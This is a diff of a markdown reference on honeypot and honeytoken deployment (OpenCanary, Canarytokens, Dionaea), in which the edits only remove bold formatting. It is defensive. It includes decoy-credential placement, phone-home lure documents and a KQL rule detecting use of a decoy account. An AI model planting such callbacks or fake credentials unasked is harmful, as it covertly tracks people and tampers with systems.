@@ -1,90 +1,90 @@
 # HONEYPOT & DECEPTION TECHNOLOGY REFERENCE
 
-> **In one minute** — This document is a field guide to deception technology: honeypots (decoy systems whose only visitors are attackers), honeytokens (fake credentials and files that alert when touched), and honeynets (whole decoy networks). Because no legitimate traffic ever touches a decoy, every alert is a true positive — which makes deception the cheapest high-fidelity detection a defender can deploy. It covers the fundamentals plus hands-on install, config, and SIEM integration for OpenCanary, Canarytokens, Dionaea, T-Pot, and Cowrie, and maps it all to MITRE ENGAGE, D3FEND, and ATT&CK.
+> In one minute — This document is a field guide to deception technology: honeypots (decoy systems whose only visitors are attackers), honeytokens (fake credentials and files that alert when touched), and honeynets (whole decoy networks). Because no legitimate traffic ever touches a decoy, every alert is a true positive — which makes deception the cheapest high-fidelity detection a defender can deploy. It covers the fundamentals plus hands-on install, config, and SIEM integration for OpenCanary, Canarytokens, Dionaea, T-Pot, and Cowrie, and maps it all to MITRE ENGAGE, D3FEND, and ATT&CK.
 
 | | |
 |---|---|
-| **Read this when** | you're planning honeypot or honeytoken coverage for a network segment, you need to pick and deploy a specific tool (SSH, SMB, web, IoT, ICS), you're wiring decoy alerts into a SIEM as P1 incidents |
-| **Start at** | [Part 1: Deception Technology Fundamentals](#part-1-deception-technology-fundamentals), [8.6 Quick Reference: Honeypot Selection Guide](#_86-quick-reference-honeypot-selection-guide), [8.5 Deployment Checklist](#_85-deployment-checklist) |
-| **Pairs with** | [DECEPTION_TECHNOLOGY_REFERENCE.md](DECEPTION_TECHNOLOGY_REFERENCE.md) (deception-program strategy + detection engineering: honeytokens, honey SPNs, cloud decoy IaC, NIST 800-53 mapping), [THREAT_INFORMED_DEFENSE_REFERENCE.md](THREAT_INFORMED_DEFENSE_REFERENCE.md), [SIEM_REFERENCE.md](SIEM_REFERENCE.md), [THREAT_INTELLIGENCE_REFERENCE.md](THREAT_INTELLIGENCE_REFERENCE.md), [THREAT_HUNTING_REFERENCE.md](THREAT_HUNTING_REFERENCE.md) |
+| Read this when | you're planning honeypot or honeytoken coverage for a network segment, you need to pick and deploy a specific tool (SSH, SMB, web, IoT, ICS), you're wiring decoy alerts into a SIEM as P1 incidents |
+| Start at | [Part 1: Deception Technology Fundamentals](#part-1-deception-technology-fundamentals), [8.6 Quick Reference: Honeypot Selection Guide](#_86-quick-reference-honeypot-selection-guide), [8.5 Deployment Checklist](#_85-deployment-checklist) |
+| Pairs with | [DECEPTION_TECHNOLOGY_REFERENCE.md](DECEPTION_TECHNOLOGY_REFERENCE.md) (deception-program strategy + detection engineering: honeytokens, honey SPNs, cloud decoy IaC, NIST 800-53 mapping), [THREAT_INFORMED_DEFENSE_REFERENCE.md](THREAT_INFORMED_DEFENSE_REFERENCE.md), [SIEM_REFERENCE.md](SIEM_REFERENCE.md), [THREAT_INTELLIGENCE_REFERENCE.md](THREAT_INTELLIGENCE_REFERENCE.md), [THREAT_HUNTING_REFERENCE.md](THREAT_HUNTING_REFERENCE.md) |
 
 ## Part 1: Deception Technology Fundamentals
 
 ### 1.1 Core Definitions
 
-**Honeypot**: A security resource whose value lies in being probed, attacked, or compromised. A honeypot is a decoy system designed to lure attackers away from real assets, observe their techniques, and gather threat intelligence. Unlike production systems, any interaction with a honeypot is inherently suspicious and constitutes an Indicator of Compromise (IOC).
+Honeypot: A security resource whose value lies in being probed, attacked, or compromised. A honeypot is a decoy system designed to lure attackers away from real assets, observe their techniques, and gather threat intelligence. Unlike production systems, any interaction with a honeypot is inherently suspicious and constitutes an Indicator of Compromise (IOC).
 
-**Honeynet**: A network of honeypots working together to simulate an entire network environment. A honeynet typically includes multiple honeypot systems representing different roles (workstations, servers, databases, printers) connected through a controlled network segment. Honeynets provide broader coverage and enable observation of lateral movement and network-level attacker behaviors.
+Honeynet: A network of honeypots working together to simulate an entire network environment. A honeynet typically includes multiple honeypot systems representing different roles (workstations, servers, databases, printers) connected through a controlled network segment. Honeynets provide broader coverage and enable observation of lateral movement and network-level attacker behaviors.
 
-**Honeytoken**: A digital artifact (credential, file, URL, API key, DNS record) that has no legitimate use but is monitored for access. Unlike honeypots (systems), honeytokens are data objects embedded within real environments. Their unauthorized access triggers an alert indicating compromise of the surrounding system.
+Honeytoken: A digital artifact (credential, file, URL, API key, DNS record) that has no legitimate use but is monitored for access. Unlike honeypots (systems), honeytokens are data objects embedded within real environments. Their unauthorized access triggers an alert indicating compromise of the surrounding system.
 
-**Deception Technology**: An enterprise security category encompassing honeypots, honeytokens, honeyfiles, decoy credentials, fake network segments, and canary traps designed to mislead, detect, and analyze attackers post-breach.
+Deception Technology: An enterprise security category encompassing honeypots, honeytokens, honeyfiles, decoy credentials, fake network segments, and canary traps designed to mislead, detect, and analyze attackers post-breach.
 
 ### 1.2 Interaction Levels
 
-**Low-Interaction Honeypots**: Simulate only specific services or protocols. They listen on ports and emulate responses without running actual vulnerable software. Examples: OpenCanary, Honeyd, simple TCP listeners. Pros: low risk, easy to deploy, scalable. Cons: sophisticated attackers may fingerprint and avoid them. Examples of emulated services: SSH banner response, HTTP 200 with fake login page, FTP greeting.
+Low-Interaction Honeypots: Simulate only specific services or protocols. They listen on ports and emulate responses without running actual vulnerable software. Examples: OpenCanary, Honeyd, simple TCP listeners. Pros: low risk, easy to deploy, scalable. Cons: sophisticated attackers may fingerprint and avoid them. Examples of emulated services: SSH banner response, HTTP 200 with fake login page, FTP greeting.
 
-**Medium-Interaction Honeypots**: Provide richer service emulation without full OS exposure. They handle multi-step protocol exchanges, capture credentials, and record session data. Examples: Cowrie (SSH/Telnet), Dionaea (SMB/HTTP). Pros: capture more attacker actions, collect payloads. Cons: higher complexity, some risk if emulation is incomplete.
+Medium-Interaction Honeypots: Provide richer service emulation without full OS exposure. They handle multi-step protocol exchanges, capture credentials, and record session data. Examples: Cowrie (SSH/Telnet), Dionaea (SMB/HTTP). Pros: capture more attacker actions, collect payloads. Cons: higher complexity, some risk if emulation is incomplete.
 
-**High-Interaction Honeypots**: Real operating systems and services, fully functional. Attackers can genuinely exploit vulnerabilities and achieve full compromise. Examples: physical or VM-based systems running unpatched Windows or Linux. Pros: capture complete attacker behavior, zero false negatives on sophistication. Cons: significant containment required, risk of pivoting to production, high maintenance overhead.
+High-Interaction Honeypots: Real operating systems and services, fully functional. Attackers can genuinely exploit vulnerabilities and achieve full compromise. Examples: physical or VM-based systems running unpatched Windows or Linux. Pros: capture complete attacker behavior, zero false negatives on sophistication. Cons: significant containment required, risk of pivoting to production, high maintenance overhead.
 
-**Pure Honeypots**: Full production-like systems with monitoring at the network and system level, not using specific honeypot software. The entire system is the decoy.
+Pure Honeypots: Full production-like systems with monitoring at the network and system level, not using specific honeypot software. The entire system is the decoy.
 
 ### 1.3 Deception Layers
 
 Effective deception operates across multiple network and system layers:
 
-- **Network Layer**: Fake subnets, phantom IPs (Honeyd), BGP black holes, decoy open ports on real servers.
-- **Service Layer**: Emulated protocols (SSH, SMB, HTTP, RDP, databases) responding to attacker scans and connection attempts.
-- **Application Layer**: Fake web applications (SNARE/Tanner), mock APIs, fake admin panels with credential capture.
-- **Data Layer**: Honeyfiles (fake sensitive documents with web bugs), canary tokens embedded in real file shares, fake database entries.
-- **Identity Layer**: Decoy AD accounts, fake service accounts with canary credentials, AWS IAM honey keys.
-- **Endpoint Layer**: Fake mapped drives, fake registry keys, planted breadcrumbs leading attackers toward monitored traps.
+- Network Layer: Fake subnets, phantom IPs (Honeyd), BGP black holes, decoy open ports on real servers.
+- Service Layer: Emulated protocols (SSH, SMB, HTTP, RDP, databases) responding to attacker scans and connection attempts.
+- Application Layer: Fake web applications (SNARE/Tanner), mock APIs, fake admin panels with credential capture.
+- Data Layer: Honeyfiles (fake sensitive documents with web bugs), canary tokens embedded in real file shares, fake database entries.
+- Identity Layer: Decoy AD accounts, fake service accounts with canary credentials, AWS IAM honey keys.
+- Endpoint Layer: Fake mapped drives, fake registry keys, planted breadcrumbs leading attackers toward monitored traps.
 
 ### 1.4 Legal Considerations
 
-**Entrapment Debate**: In most jurisdictions, honeypots are NOT entrapment. Entrapment requires law enforcement inducing someone to commit a crime they would not otherwise commit. Honeypots passively await attack — they do not solicit or induce. However, active redirection of external traffic to honeypots without authorization may raise legal issues.
+Entrapment Debate: In most jurisdictions, honeypots are NOT entrapment. Entrapment requires law enforcement inducing someone to commit a crime they would not otherwise commit. Honeypots passively await attack — they do not solicit or induce. However, active redirection of external traffic to honeypots without authorization may raise legal issues.
 
-**Evidence Admissibility**: Logs from honeypots are generally admissible as business records if chain of custody is maintained, collection methods are documented, and logs are stored with integrity verification (hashing). Timestamps should be synchronized via NTP and logged.
+Evidence Admissibility: Logs from honeypots are generally admissible as business records if chain of custody is maintained, collection methods are documented, and logs are stored with integrity verification (hashing). Timestamps should be synchronized via NTP and logged.
 
-**GDPR Considerations**: Honeypots that capture personal data (IP addresses, usernames, email content) must comply with GDPR Article 5 (data minimization), Article 13/14 (transparency), and Article 32 (security of processing). Most legal interpretations hold that data captured from attackers need not be disclosed to the attacker but should be retained only as long as necessary for investigation.
+GDPR Considerations: Honeypots that capture personal data (IP addresses, usernames, email content) must comply with GDPR Article 5 (data minimization), Article 13/14 (transparency), and Article 32 (security of processing). Most legal interpretations hold that data captured from attackers need not be disclosed to the attacker but should be retained only as long as necessary for investigation.
 
-**Authorization Boundaries**: Honeypots should be deployed only within your own network or with explicit written permission. Redirecting external traffic from third-party networks to your honeypot without their consent may violate the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), or equivalent national laws.
+Authorization Boundaries: Honeypots should be deployed only within your own network or with explicit written permission. Redirecting external traffic from third-party networks to your honeypot without their consent may violate the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), or equivalent national laws.
 
-**Liability Containment**: Honeypots should be isolated to prevent attackers from using them as stepping stones to attack third parties (which could expose the honeypot operator to liability). Network egress from honeypot segments should be blocked or heavily throttled.
+Liability Containment: Honeypots should be isolated to prevent attackers from using them as stepping stones to attack third parties (which could expose the honeypot operator to liability). Network egress from honeypot segments should be blocked or heavily throttled.
 
 ### 1.5 ROI Metrics
 
-**Attacker Dwell Time Reduction**: Honeypots provide near-zero-false-positive alerts, enabling immediate response. Organizations with honeypots report mean time to detect (MTTD) measured in minutes vs. industry average of 197 days (IBM Cost of a Data Breach Report).
+Attacker Dwell Time Reduction: Honeypots provide near-zero-false-positive alerts, enabling immediate response. Organizations with honeypots report mean time to detect (MTTD) measured in minutes vs. industry average of 197 days (IBM Cost of a Data Breach Report).
 
-**MTTD (Mean Time to Detect)**: The primary KPI for deception technology. Any access to a honeypot = immediate detection event. MTTD for honeypot-detected intrusions is typically under 1 hour vs. months for traditional SIEM-based detection.
+MTTD (Mean Time to Detect): The primary KPI for deception technology. Any access to a honeypot = immediate detection event. MTTD for honeypot-detected intrusions is typically under 1 hour vs. months for traditional SIEM-based detection.
 
-**Threat Intelligence Value**: Honeypots capture attacker TTPs (Tactics, Techniques, Procedures), malware samples, C2 infrastructure, exploit payloads, and credential stuffing lists. This intelligence informs defensive hardening across production systems.
+Threat Intelligence Value: Honeypots capture attacker TTPs (Tactics, Techniques, Procedures), malware samples, C2 infrastructure, exploit payloads, and credential stuffing lists. This intelligence informs defensive hardening across production systems.
 
-**Cost Per Detection**: Honeypots generate zero false positives (any access = IOC). Compared to SIEM rules requiring extensive tuning, honeypots provide extremely low cost-per-true-positive alert.
+Cost Per Detection: Honeypots generate zero false positives (any access = IOC). Compared to SIEM rules requiring extensive tuning, honeypots provide extremely low cost-per-true-positive alert.
 
-**Attacker Engagement Time**: High-interaction honeypots waste attacker time. Every hour spent in a honeypot is an hour not spent in production systems.
+Attacker Engagement Time: High-interaction honeypots waste attacker time. Every hour spent in a honeypot is an hour not spent in production systems.
 
 ### 1.6 MITRE ENGAGE Framework
 
 MITRE ENGAGE is a framework for adversary engagement, deception, and denial operations. It complements ATT&CK by describing defensive actions.
 
-**Goals**:
-- **Expose**: Reveal adversary presence, tools, and techniques through careful observation of honeypot interactions.
-- **Affect**: Impact adversary operations by introducing confusion, wasted resources, or false intelligence.
-- **Elicit**: Draw out adversary behaviors, capabilities, and intent through controlled interaction.
+Goals:
+- Expose: Reveal adversary presence, tools, and techniques through careful observation of honeypot interactions.
+- Affect: Impact adversary operations by introducing confusion, wasted resources, or false intelligence.
+- Elicit: Draw out adversary behaviors, capabilities, and intent through controlled interaction.
 
-**Activity Types**:
-- **Honeypot (EAC0002)**: Deploy decoy systems to detect and study adversary activity.
-- **Decoy Content (EAC0003)**: Plant fake files, credentials, and data to mislead and track adversaries.
-- **Network Diversity (EAC0019)**: Create varied network architectures to confuse adversary mapping.
-- **Lures (EAC0004)**: Create artifacts that encourage adversaries to interact with monitored resources.
-- **Burn-In (EAC0005)**: Allow adversaries limited access to observe their full toolset before responding.
-- **Pocket Litter (EAC0009)**: Add realistic but fake context to decoy environments (fake documents, browser history, saved credentials).
-- **Introduced Vulnerabilities (EAC0014)**: Intentionally introduce weaknesses in honeypots to attract exploitation attempts.
-- **Safe Harbor (EAC0023)**: Isolate adversary activity to prevent real damage while allowing observation.
+Activity Types:
+- Honeypot (EAC0002): Deploy decoy systems to detect and study adversary activity.
+- Decoy Content (EAC0003): Plant fake files, credentials, and data to mislead and track adversaries.
+- Network Diversity (EAC0019): Create varied network architectures to confuse adversary mapping.
+- Lures (EAC0004): Create artifacts that encourage adversaries to interact with monitored resources.
+- Burn-In (EAC0005): Allow adversaries limited access to observe their full toolset before responding.
+- Pocket Litter (EAC0009): Add realistic but fake context to decoy environments (fake documents, browser history, saved credentials).
+- Introduced Vulnerabilities (EAC0014): Intentionally introduce weaknesses in honeypots to attract exploitation attempts.
+- Safe Harbor (EAC0023): Isolate adversary activity to prevent real damage while allowing observation.
 
-**ENGAGE vs ATT&CK Integration**: ENGAGE activities map directly to ATT&CK techniques. For example, deploying an SSH honeypot (EAC0002) detects T1110 (Brute Force), T1021.004 (SSH), and T1078 (Valid Accounts use).
+ENGAGE vs ATT&CK Integration: ENGAGE activities map directly to ATT&CK techniques. For example, deploying an SSH honeypot (EAC0002) detects T1110 (Brute Force), T1021.004 (SSH), and T1078 (Valid Accounts use).
 
 ### 1.7 Detection Philosophy
 
@@ -94,35 +94,35 @@ Rule of thumb: deploy one honeypot per VLAN or network segment, one honeytoken p
 
 ### 1.8 Honeypot Categories by Deployment Purpose
 
-**Production Honeypots**: Deployed within an organization's network to detect intruders. Low-interaction, easy to manage. Primary goal: detection and alerting.
+Production Honeypots: Deployed within an organization's network to detect intruders. Low-interaction, easy to manage. Primary goal: detection and alerting.
 
-**Research Honeypots**: Deployed to gather information about attacker tools and tactics. High-interaction, complex to manage. Primary goal: threat intelligence collection.
+Research Honeypots: Deployed to gather information about attacker tools and tactics. High-interaction, complex to manage. Primary goal: threat intelligence collection.
 
-**Spam Traps (Spampots)**: Email addresses published in locations only harvesters would find them. Used to identify spam sources and phishing campaigns.
+Spam Traps (Spampots): Email addresses published in locations only harvesters would find them. Used to identify spam sources and phishing campaigns.
 
-**Database Honeypots**: Fake databases with fake sensitive records. Alert when records are queried or exfiltrated. Useful for detecting SQL injection that reaches data exfiltration phase.
+Database Honeypots: Fake databases with fake sensitive records. Alert when records are queried or exfiltrated. Useful for detecting SQL injection that reaches data exfiltration phase.
 
 ### 1.9 Honeynet Architecture
 
 A complete honeynet deployment includes:
 
-- **Data Control**: Mechanisms to contain attackers within the honeynet (firewall rules, rate limiting on outbound connections).
-- **Data Capture**: Collection of all attacker activity (network traffic, system calls, keystrokes).
-- **Data Collection**: Centralized, tamper-resistant log aggregation.
-- **Data Analysis**: Tools to process and extract intelligence from captured data.
+- Data Control: Mechanisms to contain attackers within the honeynet (firewall rules, rate limiting on outbound connections).
+- Data Capture: Collection of all attacker activity (network traffic, system calls, keystrokes).
+- Data Collection: Centralized, tamper-resistant log aggregation.
+- Data Analysis: Tools to process and extract intelligence from captured data.
 
 The Honeynet Project (honeynet.org) has published detailed architecture guides since 1999 and maintains open-source honeynet tools and research. Their Gen I/II/III honeynet architectures progressively improved containment while reducing attacker fingerprinting risk.
-## Part 2: Thinkst OpenCanary — Open Source Honeypot Framework
+## Part 2: Thinkst OpenCanary: Open Source Honeypot Framework
 
 ### 2.1 Overview
 
 OpenCanary is an open-source, multi-protocol honeypot developed by Thinkst Applied Research (creators of the commercial Canary product). It runs as a daemon on Linux systems and emulates multiple network services simultaneously, alerting on any connection attempt.
 
-**Design Philosophy**: OpenCanary is intentionally simple — it does not try to fully emulate complex protocols but provides enough response to trigger automated scanners, credential brute-forcers, and curious attackers. Every connection to an OpenCanary service is an alert.
+Design Philosophy: OpenCanary is intentionally simple — it does not try to fully emulate complex protocols but provides enough response to trigger automated scanners, credential brute-forcers, and curious attackers. Every connection to an OpenCanary service is an alert.
 
 ### 2.2 Installation
 
-**Prerequisites**: Python 3.6+, pip, Linux (Ubuntu/Debian/CentOS/RHEL recommended)
+Prerequisites: Python 3.6+, pip, Linux (Ubuntu/Debian/CentOS/RHEL recommended)
 
 ```bash
 # Install system dependencies
@@ -150,7 +150,7 @@ opencanaryd --status
 opencanaryd --stop
 ```
 
-**Systemd Service**:
+Systemd Service:
 ```ini
 [Unit]
 Description=OpenCanary Honeypot
@@ -220,39 +220,39 @@ The configuration file `/etc/opencanaryd/opencanary.cfg` is JSON-formatted:
 
 ### 2.4 Service Modules Detail
 
-**FTP (Port 21)**: Emulates FTP server, captures login attempts (username/password), records IP and timestamp. Any credential attempt = alert.
+FTP (Port 21): Emulates FTP server, captures login attempts (username/password), records IP and timestamp. Any credential attempt = alert.
 
-**HTTP (Port 80/443)**: Serves a configurable fake login page. Captures POST credentials, User-Agent strings, and any form submissions. Supports custom HTML templates for realistic impersonation.
+HTTP (Port 80/443): Serves a configurable fake login page. Captures POST credentials, User-Agent strings, and any form submissions. Supports custom HTML templates for realistic impersonation.
 
-**HTTPPROXY (Port 8080)**: Emulates an open HTTP proxy. Attackers attempting to use it for pivoting will trigger alerts.
+HTTPPROXY (Port 8080): Emulates an open HTTP proxy. Attackers attempting to use it for pivoting will trigger alerts.
 
-**MSSQL (Port 1433)**: Emulates Microsoft SQL Server. Captures connection attempts, login credentials, and SQL commands. Especially useful in Windows environments.
+MSSQL (Port 1433): Emulates Microsoft SQL Server. Captures connection attempts, login credentials, and SQL commands. Especially useful in Windows environments.
 
-**MySQL (Port 3306)**: Emulates MySQL server. Captures authentication attempts. Common target in automated scanning.
+MySQL (Port 3306): Emulates MySQL server. Captures authentication attempts. Common target in automated scanning.
 
-**NTP (Port 123 UDP)**: Emulates NTP server. Detects NTP amplification reconnaissance and monlist queries.
+NTP (Port 123 UDP): Emulates NTP server. Detects NTP amplification reconnaissance and monlist queries.
 
-**Redis (Port 6379)**: Emulates Redis. Captures connection attempts and commands. Redis is a common target due to frequent misconfigurations with no authentication.
+Redis (Port 6379): Emulates Redis. Captures connection attempts and commands. Redis is a common target due to frequent misconfigurations with no authentication.
 
-**SIP (Port 5060)**: Emulates Session Initiation Protocol server. Detects VoIP scanning and toll fraud reconnaissance.
+SIP (Port 5060): Emulates Session Initiation Protocol server. Detects VoIP scanning and toll fraud reconnaissance.
 
-**SMBD (Port 445)**: Emulates Windows SMB file share using Samba. Appears as a Windows workstation or server with configurable shares. Critical for detecting lateral movement and ransomware scanning.
+SMBD (Port 445): Emulates Windows SMB file share using Samba. Appears as a Windows workstation or server with configurable shares. Critical for detecting lateral movement and ransomware scanning.
 
-**SNMP (Port 161 UDP)**: Emulates SNMP agent. Detects network management reconnaissance and community string brute-forcing.
+SNMP (Port 161 UDP): Emulates SNMP agent. Detects network management reconnaissance and community string brute-forcing.
 
-**SSH (Port 22)**: Emulates OpenSSH server. Captures all authentication attempts (password and key-based). Records session initiation data. Very high volume of hits in internet-facing deployments.
+SSH (Port 22): Emulates OpenSSH server. Captures all authentication attempts (password and key-based). Records session initiation data. Very high volume of hits in internet-facing deployments.
 
-**Telnet (Port 23)**: Emulates Telnet server. Particularly effective for IoT botnets (Mirai variants) that heavily scan for Telnet.
+Telnet (Port 23): Emulates Telnet server. Particularly effective for IoT botnets (Mirai variants) that heavily scan for Telnet.
 
-**TFTP (Port 69 UDP)**: Emulates TFTP server. Detects network equipment configuration theft attempts.
+TFTP (Port 69 UDP): Emulates TFTP server. Detects network equipment configuration theft attempts.
 
-**VNC (Port 5900)**: Emulates VNC server. Detects remote desktop reconnaissance and brute-force attempts.
+VNC (Port 5900): Emulates VNC server. Detects remote desktop reconnaissance and brute-force attempts.
 
-**Portscan Detection**: OpenCanary includes built-in port scan detection. It monitors for SYN packets to closed ports and alerts when scan thresholds are exceeded. Detects Nmap, Masscan, and other common scanners.
+Portscan Detection: OpenCanary includes built-in port scan detection. It monitors for SYN packets to closed ports and alerts when scan thresholds are exceeded. Detects Nmap, Masscan, and other common scanners.
 
 ### 2.5 Alert Channels
 
-**Email**:
+Email:
 ```json
 {
     "logger": {
@@ -276,7 +276,7 @@ The configuration file `/etc/opencanaryd/opencanary.cfg` is JSON-formatted:
 }
 ```
 
-**Syslog (for SIEM integration)**:
+Syslog (for SIEM integration):
 ```json
 {
     "handlers": {
@@ -289,7 +289,7 @@ The configuration file `/etc/opencanaryd/opencanary.cfg` is JSON-formatted:
 }
 ```
 
-**Slack**:
+Slack:
 ```json
 {
     "handlers": {
@@ -301,7 +301,7 @@ The configuration file `/etc/opencanaryd/opencanary.cfg` is JSON-formatted:
 }
 ```
 
-**TCP Socket (for Logstash/Splunk)**:
+TCP Socket (for Logstash/Splunk):
 ```json
 {
     "handlers": {
@@ -316,16 +316,16 @@ The configuration file `/etc/opencanaryd/opencanary.cfg` is JSON-formatted:
 
 ### 2.6 Placement Strategy
 
-**Rule**: Deploy one OpenCanary instance per VLAN/network segment. Any alert = immediate P1 incident. No tuning required — zero legitimate traffic should ever reach a honeypot.
+Rule: Deploy one OpenCanary instance per VLAN/network segment. Any alert = immediate P1 incident. No tuning required — zero legitimate traffic should ever reach a honeypot.
 
-**Recommended Deployment Points**:
+Recommended Deployment Points:
 - Server VLAN: Emulate inactive IP addresses (pick unused IPs from DHCP exclusion range)
 - User VLAN: Place among workstation IPs
 - DMZ: Emulate additional web servers or database servers
 - OT/ICS network: Emulate PLCs or HMI systems (custom banners)
 - Cloud VPCs: Deploy in each VPC subnet
 
-**IP Selection**: Use IP addresses that are not assigned to real devices but appear in the same subnet range. This ensures that only active scanners and lateral movers will hit the honeypot (legitimate traffic goes to known hosts).
+IP Selection: Use IP addresses that are not assigned to real devices but appear in the same subnet range. This ensures that only active scanners and lateral movers will hit the honeypot (legitimate traffic goes to known hosts).
 
 ### 2.7 Docker Deployment
 
@@ -349,7 +349,7 @@ services:
       - ./logs:/var/log/opencanary
 ```
 
-**Note**: `network_mode: host` is required so the container can listen on all configured ports directly on the host network interface. Without host networking, port mapping would limit the honeypot's ability to detect port scans.
+Note: `network_mode: host` is required so the container can listen on all configured ports directly on the host network interface. Without host networking, port mapping would limit the honeypot's ability to detect port scans.
 
 ### 2.8 OpenCanary Log Format
 
@@ -393,39 +393,39 @@ The commercial Thinkst Canary product extends OpenCanary with:
 - SOC integrations (PagerDuty, ServiceNow, Splunk, Sentinel)
 
 Commercial Canaries are deployed as virtual appliances or cloud instances and phone home to the Canary console when triggered. They are widely regarded as best-in-class for enterprise deception deployment due to their reliability and near-zero management overhead. Pricing is per-device (physical Canary token) or per-flock (cloud console) with enterprise volume licensing available.
-## Part 3: Canarytokens — Honeytoken Platform
+## Part 3: Canarytokens: Honeytoken Platform
 
 ### 3.1 Overview
 
 Canarytokens (canarytokens.org) is a free service by Thinkst that generates honeytoken artifacts. When an attacker accesses a canarytoken, it sends an alert to the token owner. Unlike honeypots (which are network services), canarytokens are embedded within real environments as data artifacts.
 
-**Core Principle**: Plant canary tokens everywhere sensitive data might be accessed. Any alert = attacker has accessed that specific resource.
+Core Principle: Plant canary tokens everywhere sensitive data might be accessed. Any alert = attacker has accessed that specific resource.
 
 ### 3.2 Token Types
 
-**Web Bug (URL Token)**: A unique URL that sends an alert when loaded. Embed in documents, HTML emails, database fields, or anywhere a URL might be followed. Captures IP address, User-Agent, and referrer of the requester.
+Web Bug (URL Token): A unique URL that sends an alert when loaded. Embed in documents, HTML emails, database fields, or anywhere a URL might be followed. Captures IP address, User-Agent, and referrer of the requester.
 
-**DNS Token**: A unique subdomain that triggers an alert when DNS-resolved. Effective in air-gapped environments where HTTP is blocked but DNS is allowed. Embed in documents as server names, UNC paths, or configuration values.
+DNS Token: A unique subdomain that triggers an alert when DNS-resolved. Effective in air-gapped environments where HTTP is blocked but DNS is allowed. Embed in documents as server names, UNC paths, or configuration values.
 
-**Microsoft Word Document**: A .docx file that phones home when opened in Microsoft Word (via template injection or embedded URL). Effective as a honeyfile in file shares. Alert fires when the document is opened, even without macros.
+Microsoft Word Document: A .docx file that phones home when opened in Microsoft Word (via template injection or embedded URL). Effective as a honeyfile in file shares. Alert fires when the document is opened, even without macros.
 
-**PDF Token**: A PDF that calls home when opened in Adobe Reader or PDF viewers that execute embedded actions. Similar to Word token but for PDF-heavy environments.
+PDF Token: A PDF that calls home when opened in Adobe Reader or PDF viewers that execute embedded actions. Similar to Word token but for PDF-heavy environments.
 
-**AWS API Key**: A real but unprivileged AWS IAM key with no actual permissions but with CloudTrail monitoring. Any attempt to use the key (even failed attempts) triggers a CloudTrail event and alert. Extremely effective as a honeytoken for credential theft detection.
+AWS API Key: A real but unprivileged AWS IAM key with no actual permissions but with CloudTrail monitoring. Any attempt to use the key (even failed attempts) triggers a CloudTrail event and alert. Extremely effective as a honeytoken for credential theft detection.
 
-**WireGuard VPN Config**: A WireGuard configuration file that triggers an alert when someone attempts to connect using it. Useful for detecting stolen VPN credentials or config files.
+WireGuard VPN Config: A WireGuard configuration file that triggers an alert when someone attempts to connect using it. Useful for detecting stolen VPN credentials or config files.
 
-**SQL Server Table Token**: A token embedded as a row in a SQL Server table that alerts when queried via a specific tracking mechanism. Detects database exfiltration.
+SQL Server Table Token: A token embedded as a row in a SQL Server table that alerts when queried via a specific tracking mechanism. Detects database exfiltration.
 
-**LDAP Token**: An LDAP query token that fires when an attacker queries Active Directory for a specific attribute or object. Useful for detecting AD enumeration.
+LDAP Token: An LDAP query token that fires when an attacker queries Active Directory for a specific attribute or object. Useful for detecting AD enumeration.
 
-**Kubeconfig Token**: A Kubernetes configuration file that alerts when used to authenticate to a cluster. Detects stolen k8s credentials.
+Kubeconfig Token: A Kubernetes configuration file that alerts when used to authenticate to a cluster. Detects stolen k8s credentials.
 
-**Cloned Website**: A copy of a login page that alerts when visited, useful for detecting phishing infrastructure reuse.
+Cloned Website: A copy of a login page that alerts when visited, useful for detecting phishing infrastructure reuse.
 
-**Custom Image**: An image file that calls home when displayed, embedding a unique web bug.
+Custom Image: An image file that calls home when displayed, embedding a unique web bug.
 
-**Slow Redirect**: A URL that slowly redirects while logging attacker reconnaissance.
+Slow Redirect: A URL that slowly redirects while logging attacker reconnaissance.
 
 ### 3.3 Self-Hosted Canarytokens Deployment
 
@@ -456,7 +456,7 @@ docker-compose up -d
 # - Switchboard (alert routing)
 ```
 
-**DNS Configuration**: Point a wildcard DNS record for your token domain to the server:
+DNS Configuration: Point a wildcard DNS record for your token domain to the server:
 ```
 *.tokens.yourdomain.com  A  your.public.ip
 tokens.yourdomain.com    A  your.public.ip
@@ -508,7 +508,7 @@ events.put_rule(
 )
 ```
 
-**Embedding Strategy**: Store canary credentials in:
+Embedding Strategy: Store canary credentials in:
 - AWS credentials file on developer workstations
 - .env files in code repositories
 - Configuration management systems (Ansible vault, Terraform state)
@@ -530,7 +530,7 @@ New-ADUser -Name "svc-backup-legacy" `
 Add-ADGroupMember -Identity "Backup Operators" -Members "svc-backup-legacy"
 ```
 
-**Microsoft Sentinel Analytics Rule** (KQL):
+Microsoft Sentinel Analytics Rule (KQL):
 ```kql
 SecurityEvent
 | where EventID in (4624, 4625, 4648, 4768, 4769)
@@ -559,9 +559,9 @@ Deploy Word or PDF canarytokens as files with enticing names:
 - `C:\Users\Administrator\Desktop\SSH_Keys_Production.docx`
 - `/home/admin/aws_prod_keys_backup.pdf`
 
-**Implementation**: Generate canarytoken-embedded files from canarytokens.org or self-hosted instance. Deploy via Group Policy, Ansible, or manual placement. Any access fires an immediate alert with the source IP and user context.
+Implementation: Generate canarytoken-embedded files from canarytokens.org or self-hosted instance. Deploy via Group Policy, Ansible, or manual placement. Any access fires an immediate alert with the source IP and user context.
 
-**File System Monitoring Alternative**: Use inotifywait (Linux) or Windows File Auditing to alert on access to honeyfiles that don't use embedded callbacks:
+File System Monitoring Alternative: Use inotifywait (Linux) or Windows File Auditing to alert on access to honeyfiles that don't use embedded callbacks:
 ```bash
 # Linux inotify watch
 inotifywait -m -e access,open /sensitive/honeyfile.txt |   while read path action file; do
@@ -627,37 +627,37 @@ for share_name, share_path in shares:
             f.write(token)
         print(f'Deployed token to {filename}')
 ```
-## Part 4: Dionaea — Malware Capture Honeypot
+## Part 4: Dionaea: Malware Capture Honeypot
 
 ### 4.1 Overview
 
 Dionaea is a low-interaction honeypot specifically designed to capture malware samples. It emulates vulnerable services to lure attackers into deploying their malware, which Dionaea then captures for analysis. It is the successor to Nepenthes and is particularly effective at capturing exploits targeting Windows services.
 
-**Primary Purpose**: Capture malware binaries, exploit shellcode, and attack payloads from automated exploit tools and worms.
+Primary Purpose: Capture malware binaries, exploit shellcode, and attack payloads from automated exploit tools and worms.
 
 ### 4.2 Supported Protocols
 
-**SMB (Port 445)**: Emulates Windows file sharing, the most important protocol for Dionaea. Captures EternalBlue/MS17-010 exploits, WannaCry, NotPetya, and SMB-propagating worms. Dionaea implements the SMB protocol stack including DCERPC, allowing realistic service emulation.
